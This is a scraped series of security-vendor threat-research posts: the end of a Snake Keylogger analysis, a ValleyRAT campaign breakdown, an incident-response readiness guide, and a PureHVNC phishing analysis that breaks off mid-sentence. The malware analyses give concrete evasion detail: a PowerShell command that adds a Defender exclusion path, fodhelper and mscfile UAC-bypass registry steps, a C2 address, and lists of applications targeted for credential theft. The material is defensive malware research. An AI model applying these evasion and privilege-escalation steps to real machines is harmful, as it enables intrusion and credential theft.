Deploy module performs process hollowing, a malware technique that creates a new process and then inserts malicious code into it to run. This allows it to hide its original process. Figure 12 shows that it about to call the obfuscated API CreateProcess(). It has a key argument, “Creation Flag,” indicating how to create the process. Its value has been set to 134217732, i.e. 0x08000004 in hexadecimal. It is defined as “CREATE_SUSPENDED” and “CREATE_NO_WINDOW.” The process name, the first argument to CreateProcess(), is the same as the Loader module. To complete the process hollowing, it needs to call some relevant Windows APIs, such as ZwUnmapViewOfSection(), VirtualAllocEx(), ReadProcessMemory(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). The core module's original name is “lfwhUWZlmFnGhDYPudAJ.exe.” Figure 13 shows that the attacker has fully obfuscated the entire module, which displays its entry point (“Main()”) and the obfuscated code, class names, and method names. The Snake Keylogger's structure is very clear. We can see its capability to collect private and sensitive information from the victim’s device, including the device’s basic information, saved credentials, keystrokes, screenshots, and data on the system clipboard. The features are split into different methods driven by Timers. Snake Keylogger also has some relevant flag variables indicating whether the feature is enabled. This variant of Snake Keylogger only enables the credential collection feature. First, Snake Keylogger fetches the device’s basic information, like the PC name, System time, IP address, Country name, Region name, City name, TimeZone, and so on. Figure 14 shows an example of the basic information collected from one of my testing devices. This Snake Keylogger variant includes several hardcoded IP addresses the attacker may believe are used by some sample automatic analysis systems they want to avoid. One method called “anti_bot(),” shown in Figure 15, checks the hardcoded IP addresses. “BotDetected” is returned if the victim’s IP address matches any of those IP addresses. This results in the Snake Keylogger only collecting credentials but never sending them to the attacker. Snake Keylogger collects saved credentials from over 50 popular software programs, categorized as web browsers, email clients, IM clients, and FTP clients. Every software has its own profile folder for saving configuration data. Snake Keylogger traverses all the profile files, looking for the saved credentials. Figure 16 is an example of the method used for Google Chrome. As you may have noticed in the “Locals” tab, it just obtained one set of credentials, including “URL,” “Login ID,” and “Login Password.” All the software can be categorized as follows: Chromium-based Web Browsers:\"Google Chrome,\" \"Amigo,\" \"Xpom,\" \"Kometa,\" \"Nichrome,\" \"CocCoc,\" \"QQ Browser,\" \"Orbitum,\" \"Slimjet,\" \"Iridium,\" \"Vivaldi,\" \"Iron,\" \"Chromium,\" \"Ghost Browser,\" \"Cent Browser,\" \"xVast,\" \"Chedot,\" \"Comodo Dragon,\" \"SuperBird,\" \"360 Browser,” \"360 Chrome,” \"Brave,\" \"Torch,\" \"UC Browser,\" \"Blisk,\" \"Epic PrivacyBrowser,\" \"Liebao,\" \"Avast,\" \"Kinza,\" \"BlackHawk,\" \"Citrio,\" \"Uran,\" \"Coowon,\" \"7Star,” \"QIP Surf,” \"Sleipnir,” \"Chrome Canary,” \"ChromePlus,” \"Sputnik,” \"Microsoft Edge,\" and \"Slim\". Mozilla-based Web Browsers:\"SeaMonkey,” \"IceDragon,” \"CyberFox,” \"WaterFox,” \"Postbox,” and \"PaleMoon\" Other Web Browsers:\"Opera,” \"Firefox\". Email clients:\"FoxMail,” \"Thunderbird\". FTP clients:\"FileZilla\". IM client:\"Pidgin,” \"Discord\". All the credentials collected from the above software are temporarily stored in a global variable. Snake Keylogger variants have several ways to submit harvested credentials to the attacker, including uploading the data onto an FTP server, sending it to an email address, and submitting it over Telegram’s bot over HTTP Post method.  This variant of Snake Keylogger sends data over SMTP. Figure 17 is a screenshot of how it builds the email content. The upper part contains the code that includes the email’s sender, recipient, subject, and body, while the lower part shows the content of the variable “mailMessage” with the data filled by the code. The email’s body contains the computer's basic information saved in a global variable, followed by the credentials stolen from the victim’s computer saved in another global variable. It then creates an SMTP client, and its Send() method is called to send the credentials to the attacker. Figure 18 shows an example of how the email looks in Microsoft Outlook. Figure 19 illustrates the entire workflow of the Snake Keylogger campaign. This analysis reviewed the entire process of this Snake Keylogger campaign, which is being led by a phishing email. The phishing email, which included a malicious Excel document, lured the recipient into opening the file to see the details of a “balance payment.” The Excel document was displayed in different tools, and I explained how it downloads an HTA file by exploiting a known vulnerability. It then leverages multiple language scripts, such as JavaScript, VBScript, and PowerShell, to download the Snake Keylogger’s Loader module. Afterward, I elaborated on how the Loader module extracts multiple modules (including several middle modules and the Deploy module) from the file’s Resource section. Malware often uses a process like this to prevent being detected and analyzed. Next, I introduced how the Snake Keylogger Deploy module establishes persistence on the victim’s computer and conducts process hollowing to put the core module into a newly created process to run. Finally, we examined how the Snake Keylogger steals sensitive information from the victim’s computer and how the stolen data is sent to the attacker using the SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus service detects the attached Excel document, 107.hta, the downloaded executable file and the extracted Snake Keylogger with the following AV signatures. MSExcel/CVE_2017_0199.DDOC!exploitVBS/SnakeKeylogger.119B!tr.dldrMSIL/SnakeKeylogger.FQQD!trMSIL/SnakeKeylogger.AES!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document.

    "title": "A Deep Dive into a New ValleyRAT Campaign Targeting Chinese Speakers",
    "link": "https://www.fortinet.com/blog/threat-research/valleyrat-campaign-targeting-chinese-speakers",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium FortiGuard Labs recently encountered an ongoing ValleyRAT campaign specifically targeting Chinese speakers. This malware has historically targeted e-commerce, finance, sales, and management enterprises. ValleyRAT is a multi-stage malware that utilizes diverse techniques to monitor and control its victims and deploy arbitrary plugins to cause further damage. Another noteworthy characteristic of this malware is its heavy usage of shellcode to execute its many components directly in memory, significantly reducing its file footprint in the victim’s system. This blog provides a technical analysis of this campaign. This malware uses icons of legitimate applications, including Microsoft Office, with filenames related to financial documents similar to the following: To make the lure more believable to the user, it creates an empty file%TEMP%\\dome.docand executes the default application for opening Microsoft Office Word documents. If no default application is set, it shows an error message box with the text, “Open The Document Fail.” Upon execution, it attempts to create a mutex namedTESTto ensure that only one instance of the malware process is running on the system. After that, it deletes the following registry entries, which could have been added in a previous installation of the malware: It then stores the IP and the port of the Command and Control (C2) in the following registry entry: IpDateInfo = “|i:154.82.85.12|p:5689|” Before continuing, it determines if it’s running under a virtual machine by enumerating all services and checking if any of the following VM-related strings are on the service display names: If any of these services are found, a blank error message box is shown before it terminates. Before the shellcode is executed to load the next stage, this malware uses a known technique called sleep obfuscation to evade memory scanners. This involves adding a callback functionality to Sleep or similar APIs that modify the permissions of the allocated memory where the malicious code resides to values not commonly deemed suspicious by scanners. Furthermore, during this process, the malicious shellcode is encoded with a simple XOR operation to evade pattern-based signatures. After decoding the malicious shellcode using XOR with a single-byte key,0x60in this case, it copies the first 0xc bytes from the Sleep API function and stores it for later use. It then replaces it with code that will lead to executing the malicious callback function. This callback function changes the permission of the malicious shellcode and attempts to obfuscate it using the following procedure: In general, this malware uses shellcode blocks to run its components directly in memory. This shellcode is similar to the one shared in this GitHub repository:https://github.com/killeven/DllToShellCode/blob/master/DllToShellCode/shellcode_data.c. This specific shellcode has also been seen in older malware campaigns and detected by Fortinet as W64/Agent.CCF!tr. Once this malware has finished initializing, it decrypts a shellcode with the AES-256 algorithm using a key derived from a hardcoded 16-byte value. The result is then XOR-ed with0x60to reveal the final shellcode. It then triggers the previously mentioned sleep obfuscation routine by calling the Sleep API before finally executing the shellcode by using it as a callback procedure for theEnumSystemLocalesAAPI. The shellcode uses a hashing algorithm called BKDR to obfuscate the API names, which are then used to search for the target APIs by directly traversing the Process Environment Block (PEB). After checking standard 64-bit PE characteristics from the payload, the shellcode reflectively loads the embedded DLL, in this case, the beaconing module, by copying it to another memory location, adjusting its base relocation, and manually resolving its imports before its entry point is executed. The beaconing module is responsible for loading the RuntimeBroker and RemoteShellcode components. It also allows the malware to persist and gain administrator privileges in the system while ensuring that no AV-related processes are running before it starts communicating with its C2 server. This malware adds a scheduled task to allow its component,Loader- discussed in a later section – to execute automatically upon user login. Furthermore, for theLoadercomponent to be executed with high privilege without triggering Windows’ UAC, it employs a known technique that abuses the auto-elevate properties of the legitimate applications,C:\\Windows\\System32\\zh-CN\\eventvwr.mscorC:\\Windows\\System32\\CompMgmtLauncher.exe.  By design, these applications eventually lead to the execution of the current default value set on the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Command, which will be set to the path of theLoadercomponent in a later stage of infection. It attempts to evade detection from Microsoft Windows Defender by adding the root drive of the malware path to the exclusion by executing the following PowerShell command: Invoke-Command -Command {Add-MpPreference -ExclusionPath {drive} Instead of usually running the command as an argument to the PowerShell process, it uses pipes to communicate with a newly created PowerShell process to execute commands. This could be an attempt to evade AV products that inspect suspicious process arguments. By default, it adds the common root drive \"C:\\\" to the list of excluded paths. If the malware was executed from another root drive, it will also be added to the list. It then proceeds to kill AV-related processes containing the following executable filenames: Notably, the executable names listed are components of products developed by Chinese companies reaffirming their target preference. To determine if the processes have been successfully terminated, it does another scan of the running processes to check if any process with the following executable filenames is still running: If any of these processes are still running, it performs another attempt to kill them by injecting a shellcode with an embedded DLL into a runninglsassprocess. This DLL performs the following procedures: Once the AV processes are no longer running, it modifies the following AV product settings in the registry to disable their autostart and/or reduce their effectiveness: If the AV programs are still found running, the malware process displays an “ERROR” message box and terminates. If the user has administrator privileges, it attempts to execute a new process of itself with elevated privileges without prompting Windows’ UAC(User Access Control) security feature using two known methods. The first method involves abusing the CMSTPLUA COM class, specifically theShellExecmethod of the ICMLuaUtil interface. Since the system automatically grants this class elevated privileges, any process executed using this interface will gain the same. Before using the interface to execute a new process of itself, it attempts to disguise itself as a legitimate explorer.exe process by locating the ProcessParameters structure in the Process Environment Block (PEB) and replacing its ImagePathName and CommandLine fields with the path of the legitimate explorer.exe. The second method exploits another legitimate application called fodhelper.exe.Like the first method, this executable gets high privilege upon execution. First, it creates the registry keyHKCU\\Software\\Classes\\.pwn\\Shell\\Open\\commandand sets its default value to the malware path. Next, it creates another registry key, HKCU\\Software\\Classes\\ms-settings\\CurVer, and sets its default value data to .pwn, associating it with the previously created malicious registry entry. Finally, it executes the legitimate fodhelper.exe, which executes whatever ProgID is defined in the CurVer subkey. This leads to the execution of the malware with high privilege. At this stage, the malware initiates its communication with its C2 to request other components needed for the next stages of the infection. Prior to this, it checks for internet connectivity by attempting to connect to the legitimate Chinese search engine,http://www.baidu.com. The requests sent by this malware at this stage are all in plaintext, but the responses from the C2 are encoded with a randomly generated single-byte XOR key, except for the requests to get the component sizes. This key is included in the malware’s requests in the format{request}_{xor key}. There are three possible configurations with the malware request methods to the C2 and its corresponding procedure for storing and executing succeeding components in the system. In the specific sample we analyzed, it is configured to request two shellcode blocks from its C2: internally namedRemoteShellcodeandRuntimeBroker.To do this, it determines the sizes of the shellcode blocks by sendingGetRemoteShellcodeSize_{xor key}andGetRuntimeBrokerSize_{xor_key}. The sizes received from the C2 are used to check the integrity of the shellcode upon receipt. After that, the C2 sends the shellcode encoded with the XOR key included in the malware’s requests. A traffic example is provided in the image below: RemoteShellCodeandRuntimeBrokerare decoded and injected into newly created processes of legitimate Windows applications C:\\Windows\\System32\\colorcpl.exe and C:\\Windows\\System32\\cleanmgr.exe, respectively. The functions for these components are detailed in the next sections. Meanwhile, the second method is like the first in that they both request two components from the C2—this time, they arewwlib.dll andWinword.exe.While the previous method’s execution of the components takes place in-memory, this method involves writing the components to the disk. Like the previous method, it also requests the sizes of the components. For the size ofwwlib.dll, it sendsGetWwlibSize_{xor key}.Although the sample we analyzed does not contain the request string for retrieving the size ofWinword.exe,extrapolating from the analysis of the first method, it can be assumed that it could sendGetWinWordSize_{xor key}beforehand.After the sizes have been determined, it sendsGetWWlib_{xor key}andGetWinWord_ {xor key}to receive the binaries, which are then written to the%UserProfile%directory.It then executesWinword.exe.Based on other reports,Winword.exeis a legitimate Microsoft Office Word executable, which would then be executed, inadvertently loading the maliciouswwlib.dllupon execution. Finally, the last method sendsGetOnline_{xor key}to download an executable file, which is then saved asalgbg.exein the%UserProfile%directory. It could sendGetOnlineSize_{xor key}to get the executable size beforehand. This shellcode loads and executes a DLL whose primary purpose is downloading a component namedLoaderfrom the C2 server. The DLL sends the request stringsGetLoaderSize_{xor key}andGetLoader_{xor key}to the C2, which responds with the size and the requested executable file, respectively. This file is then saved asLoader.exein the%USERPROFILE%directory.After dropping the executable file, it sets the default value of the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Commandto the said file path. This is to complete the autostart mechanism partially set up by the beaconing module mentioned earlier. This effectively allows the newLoadercomponent to run automatically when the user logs in. At the time of analysis, theLoadercomponent received from the C2 has the same function as the first-stage loader, which is to execute the beaconing module. We can see in the figure below that the WinMain of the first-stageLoaderis very similar to theWinMainof the newerLoaderexecutable from the C2. Fortinet detects these variants asW64/RCShell.A!tr. Setting aside the striking similarities, this new component has a few behaviors outside the first-stage loader, as detailed below. It attempts to detect if it is running inside a sandbox system by counting the files inside the%TEMP%directory. This malware terminates if the number of temporary files is less than 30. Since these systems are restored after every test, they usually have fewer temporary files than conventional systems. To continue execution, it makes sure that any of the following registry keys related to popular communication applications in China are found in the system, further confirming our belief that this malware specifically targets Chinese systems: While the first-stage loader uses the AES-256 algorithm to encrypt the shellcode, an interesting method this malware uses in other samples is to disguise the payload within the malware body by keeping them as UUID strings or IP addresses and then converting these benign-looking strings into their hex-byte equivalent to form the shellcode. The primary purpose of this component is to request the downloader of the ValleyRAT payload. In addition, it contains the embedded configuration marked with the string “codemark” for the payload to use during its execution at a later stage. This configuration is very similar to the previously reported ValleyRat campaigns, where it contains the latest C2 servers as well as other settings for the RAT. To request the payload downloader, it sends the string 64 or 32, depending on the system’s architecture. As shown in the image below, the C2 responds with the payload downloader encoded with XOR, where the key is derived by adding 0x36 to a 10-byte value from the C2's response. Similar to how the earlier components are loaded, the shellcode reflectively loads the embedded payloader DLL and executes its export namedloadwhile passing the previously mentioned configuration as an argument. We detect this component asW64/ValleyRat.A!tr.spy.The C2 configuration from the previous module is decoded by simple string reverse, which is then parsed to configure the downloader. Depending on the configuration, it uses UDP or TCP sockets to connect to the C2 and receive the final payload. First, it will send the size and the key for encrypting the payload, to which the C2 responds with the encoded SHA256 hash of the payload. Lastly, it sends登录模块.dll_bin(translated asLogin module.dll_bin) to request the ValleyRAT malware. A shellcode with the embedded ValleyRAT DLL is then decoded using the same method used to decode the payload downloader. This shellcode is stored in the registry valued33f351a4aeea5e608853d1a56661059on keyHKEY_CURRENT_USER\\Console\\1. Upon execution of the shellcode, the ValleyRAT DLL is reflectively loaded and executed in the system. This relatively new RAT is attributed to the suspected APT group “Silver Fox”. This malware's capabilities are focused on graphically monitoring the user's activities and delivering other plugins and possibly other malware to the victim system. These are the commands supported by this variant: In this article, we have detailed an elaborate and ongoing ValleyRAT campaign specifically targeting Chinese systems. This malware involves several components loaded in different stages and mainly uses shellcode to execute them directly in memory, significantly reducing its file trace in the system. Once the malware gains a foothold in the system, it supports commands capable of monitoring the victim's activities and delivering arbitrary plugins to further the threat actors’ intentions. FortiGuard Labs will continue to monitor this ongoing campaign. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

    "content": "FortiGuard Labs Threat Research Let’s face it: Cyberthreats aren’t going anywhere. As technology continues to evolve and grow, so will the tactics and techniques used by threat actors. A recentreport from Statistaestimates the global cost of cybercrime to reach $15.63 trillion by 2029. To combat this, one of the most important things organizations can do is be prepared.According to the National Institute of Standards and Technology(NIST), the incident response life cycle can be broken down into four key stages, with the first, and arguably most important, being preparation. Your organization can take several proactive preparatory steps to ensure incident response (IR) readiness, including evaluating the existing threat landscape of your environment. These steps include conducting regular risk assessments, implementing comprehensive security policies, and providing continuous monitoring and threat intelligence gathering. Organizations can enhance their IR capabilities by investing in training programs and simulation exercises, enabling a swift and effective reaction to cyber incidents. Let’s examine several readiness activities that can be conducted well before any cybersecurity incident. These activities can ultimately help improve your organization’s overall IR and cybersecurity maturity. Feeling prepared for a worst-case scenario can be deceptive because untested organizations may not fully grasp what they are unaware of. Readiness assessments conducted by an external third party provide a critical perspective on your organization’s current state of readiness. Such assessments should include evaluating processes, procedures, personnel, documentation, and technology to gauge the maturity of your organization’s overall IR readiness. Unlike an audit, these assessments are designed to pinpoint potential weaknesses that could undermine your ability to respond effectively to an incident. Organizations can proactively address deficiencies outside active engagement by identifying people (capacity and skill gaps), processes, or technology. This proactive approach identifies opportunities to strengthen resilience against cyberthreats and enhances readiness. Ultimately, such assessments empower organizations to fortify their defenses and better protect themselves in an increasingly complex and challenging cybersecurity landscape. An IR plan serves as a comprehensive guidebook for managing cyber incidents. It meticulously outlines your organization’s response strategies before, during, and after incidents of any type and severity. It also details the structure of your IR team, specifying roles and responsibilities to ensure clarity and efficiency during an incident. The plan encompasses the essential steps of IR: preparation, detection and analysis, containment, eradication and recovery, and post-incident activity. Each step is designed to methodically address and mitigate the impact of incidents, ensuring a structured approach to incident management. Additionally, an effective plan defines goals and objectives, incident severity levels, and other crucial elements that contribute to a comprehensive response framework. Most importantly, the IR plan should be viewed as a living document. It requires regular updates and maintenance to remain effective and relevant. Fortinet recommends conducting a bi-annual review of the plan and an evaluation after each significant incident. This review process ensures that lessons learned are integrated into the plan and that any organizational changes are reflected and addressed. Without such a plan, organizations may make ad hoc decisions during a crisis, leading to costly and ineffective outcomes. A well-maintained IR plan provides a clear roadmap during incidents and enhances your organization’s ability to respond swiftly and effectively to challenges. Incident response playbooks are an essential extension of the broader IR plan, offering standardized procedures tailored to specific incidents. Such playbooks provide a clear, actionable framework that outlines the precise steps an organization must take to prepare for, respond to, and recover from each distinct type of incident. By focusing on specific incident scenarios, playbooks ensure that the response is not only swift but also effective and consistent. Each IR playbook provides detailed guidance on all phases of IR, including preparation, detection and analysis, containment, eradication, recovery, and post-incident activity. These documents should also designed to be comprehensive, featuring step-by-step action items assigned to specific members of the response team. This level of detail ensures that all tasks are accounted for and every objective is met during an incident response. Typical playbooks include ransomware, malware, business email compromise, denial-of-service attacks, data loss incidents, lost or stolen devices, insider threats, and zero-day vulnerabilities. The playbook should delineate specific actions and responsibilities for each scenario, ensuring the response team is well-prepared to handle an incident efficiently and confidently. Once an IR plan and playbook are in place, it’s time to test them with a tabletop exercise. According toNIST, a tabletop is “a discussion-based exercise where personnel… [discuss] their roles during an emergency and their responses to a particular emergency situation.” To simplify, a tabletop exercise is like a role-playing game. A facilitator provides the participants with facts, or “injects,” about a fictional cybersecurity incident. The participants then discuss how to respond to those facts using the IR plan and playbook as a guide. These exercises can be developed and catered to a specific audience, usually as an operational exercise for technical team members or a senior-level exercise where organizational leaders focus on business and policy-related decisions during an incident. Tabletop exercises should be conducted at least annually. However, a quarterly cycle is optimal for the teams to stay fresh and improve their response to cybersecurity incidents. Unfortunately, many security and IT professionals are unaware of what IR resources exist or how to access them. This makes it difficult for security teams to understand the context of an observed activity or efficiently discover an incident’s breadth and depth. It is also not uncommon for security and IT professionals to not know what data may be impacted when a system is compromised. In either scenario, critical time may be wasted tracking down business owners, building out network maps, or other activities that should have occurred well before an incident. This can significantly slow response efforts and increase business impact. System inventories should include information such as the business owner, system functionality, hostnames and IPs,data classification, data criticality, relevant audit or regulatory information, and other crucial identifying information that could be useful to incident responders. Such information can help identify and ensure timely responses to the most critical systems across the organization. Understanding the business processes associated with these systems is essential so informed decisions can be made throughout the incident. Network diagrams assist incident responders in understanding where systems are, how the network is segmented, and potential chokepoints or isolation points that can be used to help contain and eradicate a threat actor. Developing system inventories and network diagrams before an incident enables a more efficient and effective response, enabling responders to understand the organizational impact of a given system being compromised during an incident. Threat actors thrive on exploiting vulnerabilities in internet-facing systems as an initial access vector. Based on IR engagements handled by the FortiGuard IR team in the second half of 2023 and the first half of 2024, 46% of all incidents were directly the result of an exploit in a public-facing application. Vendors have often provided patches for these vulnerabilities weeks, months, and sometimes years before being exploited by the threat actor. While one can argue that patching is not foolproof due to zero-day vulnerabilities, patching known vulnerabilities efficiently narrows the organization’s threat landscape and removes low-hanging fruit that can be an enticing entry point. Vulnerability assessments are critical for evaluating and refining the effectiveness of a patch management process. These assessments are typically scoped to target internal or external IPs or systems, employing automated tools and manual techniques to scrutinize existing vulnerabilities across systems, applications, and network devices. It is essential during such assessments to meticulously review results to eliminate false positives and accurately assess the potential impact of vulnerabilities on the organization. While vulnerability assessments focus on known vulnerabilities, penetration tests play a complementary role in uncovering unknown weaknesses that may compromise your organization’s networks, systems, or applications. Penetration testing can be tailored to specific environments, such as internal or external networks, or even concentrate on individual segments within these networks. These assessments are designed to identify potential entry points threat actors could exploit to infiltrate external environments or pivot within internal networks. Alternatively, penetration tests may focus on a specific web or mobile application, conducting a thorough examination to identify potential vulnerabilities that could be exploited for malicious purposes or to gain unauthorized access within a network. Although regulatory requirements may mandate annual penetration tests for specific environments, it is prudent for many organizations to conduct these assessments more often. Given the dynamic nature of networked environments—with continual integration of new systems and technologies—vulnerability assessments should be scheduled frequently, often monthly, with penetration testing commonly occurring at least annually and, if possible, more often. Active Directory (AD) infrastructures typically expand as organizations grow organically. While integral to Identity and Access Management (IAM) programs, AD environments are often neglected in terms of thorough management and security oversight. Conducting a comprehensive review of the AD environment is crucial to ensuring alignment with critical recommendations from Microsoft and standards bodies, such as NIST. This alignment enhances the overall security posture of the AD configuration and facilitates the optimization of logging features to support data collection and drive more effective incident detection and investigation efforts. An assessment of an AD environment should include evaluating its configuration against industry best practices. This process aims to identify and remediate potential security gaps, misconfigurations, or vulnerabilities malicious actors could exploit. By implementing recommended protocols, organizations can significantly reduce their overall threat landscape and strengthen their defenses against unauthorized access and potential breaches. Reviewing and enhancing AD logging is essential for swift and accurate incident response. Properly configured logs provide crucial insights into user activities, authentication attempts, and system events, enabling security teams to detect and mitigate threats promptly. This proactive approach helps mitigate potential risks and ensures compliance with regulatory requirements and industry standards. Investing in a thorough review and continuous management of the AD environment is essential for maintaining robust IAM practices and bolstering overall cybersecurity resilience. Many cybersecurity incidents can persist undetected for weeks or even months, underscoring the critical role of logs in effective incident investigation. Adopting a risk-based approach is essential for determining which logs to capture, defining retention periods, and establishing the necessary level of detail to support the investigative process. By aggregating logs generated by devices, networks, and security solutions, organizations can correlate data to assist in investigations and detect anomalous behaviors across their environment. Centralized logging forms the foundation of an effective detection program, but monitoring this collated information is equally vital. Without robust monitoring, organizations can overlook or miss critical alerts, potentially escalating cybersecurity incidents. Therefore, organizations must diligently ensure responsiveness to anomalies and alerts identified through comprehensive logging and security alerting mechanisms. By integrating centralized logging and vigilant monitoring, organizations can proactively identify and respond to events before they escalate into full-blown incidents. This proactive stance enhances IR capabilities and strengthens overall cybersecurity defenses, safeguarding against potential threats in today’s dynamic threat landscape. Over the past year, the FortiGuard IR team has observed a notable rise in the use of valid credentials during their engagements, accounting for approximately 54% of initial access methods. This trend underscores the growing sophistication of attackers who exploit legitimate credentials to gain unauthorized access, often enabling them to bypass traditional security measures. To effectively combat this threat, organizations should prioritize profiling normal user behavior within their environments to identify deviations indicative of malicious activity. One powerful approach is the implementation ofUser and Entity Behavior Analytics(UEBA). UEBA leverages advanced algorithms and machine learning to monitor user actions, establish behavioral baselines, and detect anomalies that could signal security incidents. For organizations utilizingFortiSIEM, deploying FortiSIEM agents with UEBA enabled can facilitate detailed user activity data collection, which can help detect anomalous, malicious behavior. However, sophisticated tooling is not strictly necessary for user behavior analysis, provided robust logging practices exist (see item 9 above). Organizations can create comprehensive behavioral baselines by systematically logging various user activities, such as logon times, devices used for authentication, accessed systems, and utilized applications. These baselines enable the identification of deviations that might indicate potential cybersecurity incidents. Defining what constitutes normal behavior and establishing thresholds for abnormal activities are crucial steps. When anomalies are detected, they may indicate compromised accounts or insider threats, necessitating immediate investigation and response. Regardless of how user behavior analysis is conducted, it’s crucial to have a playbook in place for response and responders. Integrating behavior profiling into security strategies is essential for mitigating the increasing threat of credential misuse. By leveraging UEBA (or even basic logging and monitoring), organizations can create a dynamic and responsive security posture that can quickly adapt to identify and mitigate threats. This proactive approach enhances early detection of malicious activities, strengthens IR capabilities, and fortifies your organization’s security framework. While this list is not exhaustive, and every organization must take additional measures, it covers the most common weaknesses found within the organizations Fortinet works with.

    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High This past April, FortiGuard Labs uncovered a sophisticated attack that leveraged multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. However, this attack campaign didn’t end with VenomRAT, as the subsequently loaded plugin continued to deploy various types of malware into the victim’s environment. We recently identified a phishing campaign that also employs multiple layers of evasion techniques to deploy various malware into an infected environment. This campaign was aimed at employees and posed as a customer requesting a service. The email uses urgent language to deceive a victim into clicking a malicious attachment, initiating a series of harmful activities and deploying several types of malware. All the malware in this attack uses the same packing and obfuscation techniques, including a Python obfuscator, ‘Kramer,’ a shellcode generator, 'donut,' and a shellcode loader, 'laZzzy,' to conceal itself from detection. The deployed malware includes XWorm, Venom RAT, AsyncRAT, and PureHVNC. Figure 1 shows the attack chain. This threat report describes how this attack is delivered and analyzes the PureHVNC malware used in this campaign. The attack campaign starts with an email, shown in Figure 2. It implies that the inquiry email is from a customer and urges the recipient to open the attachment. This typical phishing email tactic uses job-related information and urgent language to deceive recipients into opening attachments or clicking links. The attachment is an HTML file that uses the “search-ms” functionality to query the “e_Statement” LNK file on remote file shares, as shown in Figure 3. Once the user opens the HTML file and clicks on “Open” to allow Windows Explorer to open, the malicious LNK file is shown in Windows Explorer and lures the user into executing it using a PDF icon. The LNK file contains a command to run a remote batch file using conhost.exe as the parent process. The attacker attempts to leverage the built-in Windows binary 'conhost.exe' for indirect execution to evade detection, as shown in Figure 4. This is an obfuscated batch file that hides the script by combining encoding tricks and string obfuscation. The file looks like UTF-16 encoding with Chinese characters because the bytes (FF FE) at the beginning can mislead a file editor into incorrectly detecting the encoding. Next, it performs a large number of character replacement operations with the specific charset. The de-obfuscation process is shown in Figures 5 and 6. The script begins by opening a decoy PDF file from the same remote file share. Next, it downloads two ZIP files via PowerShell, extracts all the content—including the Python Environment—into the folder \"%USERPOFILE%\\Downloads\\Python,\" sets the folder to hidden, and then runs the malicious Python program in sequence. Next, the decoy PDF is re-opened, initiating a persistence routine to download a second batch file and move it to the startup folder. The second ZIP file, used by the startup batch and containing several Python programs similar to those in the previous ZIP, is extracted to the “%USERPOFILE%\\Downloads\\Print” folder. Before completing all tasks, any unnecessary programs from subsequent tasks are removed. Each Python file is quite similar, as shown below. First, it imports a Base64 module to decode shellcode data and then decrypts it using an RC4 algorithm with a specific key. Finally, the code executes shellcode using an imported “ctypes” module. It should be noted that the RC4 key varies in each Python file. By tracking the same series of samples, we discovered a new Python shellcode loader. It's a compiled version of a Python file with an additional obfuscation layer added. The obfuscator, named \"Kramer,\" is available on GitHub, as shown in Figure 8. It obfuscates a Python file by encrypting the source code using an addition operation with a randomly generated key. The resulting obfuscated Python program combines the encrypted data with functions that limit the use of print and input commands, decode the encryption data, and execute the original source code. Finally, the program is compiled into a .pyc file and renamed with a .py extension. By extracting the key and encrypted data and following the decode function defined in the code, we obtained the source code. In this version, the code structure is similar, but the function names and variables are not obfuscated. The first shellcode primarily functions to decrypt and execute the next stage while bypassing AMSI/WLDP based on its configuration. The hack tool, \"donut,\" produces the shellcode, as shown in Figure 10. Once the decryption routine is completed, the decrypted data in memory reveals the flag, the APIs used for bypass mechanisms, and the entire PE file for the next stage, as seen in Figure 11. The second stage is a PE file that uses the Microsoft Management Console (MMC) icon, a built-in Windows program, to disguise itself as a regular application while functioning as an injector. This injector includes detailed debug information. As the program runs, each step of the injection process is displayed on the command line, as shown in Figure 12. We observed that a shellcode loader named \"laZzzy\" is publicly available on GitHub. It incorporates various execution techniques commonly used by malware and appears to be utilized in this stage for shellcode decryption, injection, and execution. Ultimately, the program uses the target and execution techniques selected by the attacker to inject the shellcode into notepad.exe and executes the shellcode via Early Bird APC Queue, as shown in Figure 13. The third stage involves a shellcode within notepad.exe, which is identical to the code found in the first shellcode. After decryption and bypassing AMSI/WLDP, the final payload is executed. In the next section, we will focus on PureHVNC, one of the malware identified in this attack campaign, along with additional plugins downloaded by the malware. We observed an unusual malware packed and obfuscated in the Remote Access Trojans (RAT) used in this attack campaign. It’s a .NET application containing a substantial block of built-in data. Its primary function is to decrypt its payload using the AES algorithm and then decompress it with the Gzip method. Once the DLL payload is extracted and loaded into memory, it employs its hard-coded class and method names to execute the payload's entry point, as shown in Figure 14. DLL Payload is protected by .NET Reactor, as seen in Figure 15. We partially de-obfuscated the program and renamed the functions. Its entry point was very easy to understand. After creating a mutex, the core function is then executed. In its core functionality, the program initially extracts the hardcoded configuration by performing base64 decoding followed by gzip decompression. Based on the flags in the configuration, it either sets the registry run key using PowerShell or prevents the system from sleeping by utilizing the Win32 API function, “SetThreadExecutionState,” as seen in Figure 16. Next, it attempts to communicate with the C2 server specified in the extracted configuration. Once the connection is established, it begins gathering victim information and reporting it to the C2 server, as shown in Figure 17. It abuses the Windows Management Instrumentation (WMI) system to gather information about the victim's system environment, including installed antivirus products, system and camera details, and user information. The VictimID is generated from the processor ID, disk serial number, memory serial number, and username. Additionally, the program searches for the paths of various extensions and applications based on a predefined list, as shown in Figures 18 and 19. Some applications also check the registry path to verify their installation. This 